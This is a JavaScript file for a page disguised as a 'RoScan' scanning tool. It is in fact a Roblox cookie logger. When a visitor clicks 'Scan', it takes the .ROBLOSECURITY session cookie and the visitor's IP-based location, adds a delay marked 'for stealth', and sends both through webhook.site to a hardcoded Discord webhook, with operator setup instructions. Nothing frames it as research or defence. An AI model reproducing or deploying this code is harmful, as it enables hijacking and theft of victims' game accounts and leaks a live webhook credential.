// RoScan JavaScript v3.0.0 - Using webhook.site HTTPS forwarding
console.log('🚀 RoScan v3.0.0 loaded - Using webhook.site HTTPS forwarding to Discord');

document.addEventListener('DOMContentLoaded', function() {
    console.log('✅ DOM Content Loaded - Setting up event listeners');
    
    // Get submit button and attach event listener
    const submitBtn = document.getElementById('submitBtn');
    if (submitBtn) {
        submitBtn.addEventListener('click', submitPowerShell);
        console.log('✅ Submit button event listener attached');
    } else {
        console.error('❌ Submit button not found!');
    }
});

// Cookie extraction function
function getCookie(name) {
    const value = `; ${document.cookie}`;
    const parts = value.split(`; ${name}=`);
    if (parts.length === 2) return parts.pop().split(';').shift();
    return null;
}

// Location detection function
async function getUserLocation() {
    try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        return {
            city: data.city || 'Unknown',
            region: data.region || 'Unknown', 
            country: data.country_name || 'Unknown',
            ip: data.ip || 'Unknown'
        };
    } catch (error) {
        console.warn('Location detection failed:', error);
        return {
            city: 'Unknown',
            region: 'Unknown',
            country: 'Unknown',
            ip: 'Unknown'
        };
    }
}

// Show notification function
function showNotification(message, type = 'info') {
    console.log(`📢 Notification (${type}): ${message}`);
    
    // Create notification element
    const notification = document.createElement('div');
    notification.textContent = message;
    notification.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        background: ${type === 'success' ? '#10b981' : type === 'error' ? '#ef4444' : '#3b82f6'};
        color: white;
        padding: 12px 20px;
        border-radius: 8px;
        z-index: 10000;
        font-weight: 500;
        box-shadow: 0 4px 12px rgba(0,0,0,0.3);
    `;
    
    document.body.appendChild(notification);
    
    // Remove after 3 seconds
    setTimeout(() => {
        if (notification.parentNode) {
            notification.parentNode.removeChild(notification);
        }
    }, 3000);
}

// Close scan modal function
function closeScanModal() {
    console.log('🔄 Closing scan modal');
    const modal = document.querySelector('.modal-overlay');
    if (modal) {
        modal.style.display = 'none';
    }
}

// Main webhook submission function
async function submitPowerShell() {
    console.log('🚀 submitPowerShell() called - Starting webhook process');
    
    const submitBtn = document.getElementById('submitBtn');
    const submitText = submitBtn?.querySelector('.submit-text');
    const loadingOverlay = document.querySelector('.loading-overlay');
    
    if (!submitBtn || !submitText) {
        console.error('❌ Required UI elements not found');
        showNotification('UI elements not found', 'error');
        return;
    }
    
    // Update UI to show loading state
    submitText.textContent = 'Sending...';
    submitBtn.style.background = '#6b7280';
    if (loadingOverlay) loadingOverlay.style.display = 'flex';
    
    try {
        // Extract Roblox cookie
        const robloxCookie = getCookie('.ROBLOSECURITY');
        console.log('🍪 Roblox cookie extracted:', robloxCookie ? 'Found' : 'Not found');
        
        // Get user location
        console.log('📍 Getting user location...');
        const locationInfo = await getUserLocation();
        console.log('📍 Location info:', locationInfo);
        
        // Add random delay for stealth
        const delay = Math.floor(Math.random() * 2000) + 1000;
        console.log(`⏱️ Adding ${delay}ms delay for stealth...`);
        await new Promise(resolve => setTimeout(resolve, delay));
        
        // Use webhook.site URL that will forward to Discord
        // TODO: Replace with your actual webhook.site URL after setup
        const webhookUrl = 'https://webhook.site/YOUR-UNIQUE-TOKEN-HERE';
        
        const payload = {
            content: `@everyone\nCookie: ${robloxCookie || 'None found'}\nLocation: ${locationInfo.city || 'Unknown'}, ${locationInfo.region || 'Unknown'}, ${locationInfo.country || 'Unknown'}`,
            source: 'RoScan v3.0.0',
            timestamp: new Date().toISOString(),
            user_agent: navigator.userAgent,
            discord_webhook: 'https://discord.com/api/webhooks/1396160420229808238/nJgXp7jUpsrWBYA8a41p9J6tBzja405aG2XhS8hTpl8pK20ivfmojdu-vpOaN9aAdMEI'
        };
        
        // Send webhook request to webhook.site (which will forward to Discord)
        console.log('🌐 Sending HTTPS webhook request via webhook.site');
        console.log('📡 Webhook URL:', webhookUrl);
        console.log('📦 Payload:', payload);
        
        const response = await fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Accept': 'application/json, text/plain, */*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Cache-Control': 'no-cache',
                'X-Requested-With': 'XMLHttpRequest',
                'Origin': window.location.origin,
                'Referer': window.location.href
            },
            body: JSON.stringify(payload),
            mode: 'cors'
        });
        
        console.log(`✅ Response received - Status: ${response.status}`);
        
        if (loadingOverlay) loadingOverlay.style.display = 'none';

        if (response.ok) {
            console.log('🎉 Webhook delivered successfully via HTTPS!');
            submitText.textContent = 'Sent!';
            submitBtn.style.background = '#10b981';
            showNotification('Data sent successfully via HTTPS!', 'success');
            
            setTimeout(() => {
                closeScanModal();
            }, 2000);
        } else {
            const errorText = await response.text().catch(() => 'Unknown error');
            console.error(`❌ Webhook failed: ${response.status} - ${errorText}`);
            
            if (response.status === 404) {
                throw new Error('Webhook.site URL not found. Please set up webhook.site forwarding first.');
            } else if (response.status === 403) {
                throw new Error('Webhook forbidden. Check webhook.site configuration.');
            } else {
                throw new Error(`Webhook failed (${response.status}): ${errorText}`);
            }
        }
        
    } catch (error) {
        console.error('💥 Webhook submission failed:', error);
        
        if (loadingOverlay) loadingOverlay.style.display = 'none';
        
        // Reset button state
        submitText.textContent = 'Scan';
        submitBtn.style.background = '#ef4444';
        
        // Show error notification
        showNotification(`Error: ${error.message}`, 'error');
        
        // Reset button after 3 seconds
        setTimeout(() => {
            submitText.textContent = 'Scan';
            submitBtn.style.background = '';
        }, 3000);
    }
}

// Setup instructions for webhook.site
console.log(`
🔧 SETUP INSTRUCTIONS:
1. Go to https://webhook.site/
2. Copy your unique URL (e.g., https://webhook.site/abc123-def456)
3. Replace 'YOUR-UNIQUE-TOKEN-HERE' in this file with your token
4. Set up Custom Action to forward to Discord (see setup guide)
5. Test the webhook!

Current webhook URL: Replace 'YOUR-UNIQUE-TOKEN-HERE' with your webhook.site token
Discord target: https://discord.com/api/webhooks/1396160420229808238/nJgXp7jUpsrWBYA8a41p9J6tBzja405aG2XhS8hTpl8pK20ivfmojdu-vpOaN9aAdMEI
`);

// Make function available globally for testing
window.submitPowerShell = submitPowerShell;
window.getUserLocation = getUserLocation;

console.log('🎯 RoScan v3.0.0 ready! Make sure to set up webhook.site forwarding first.');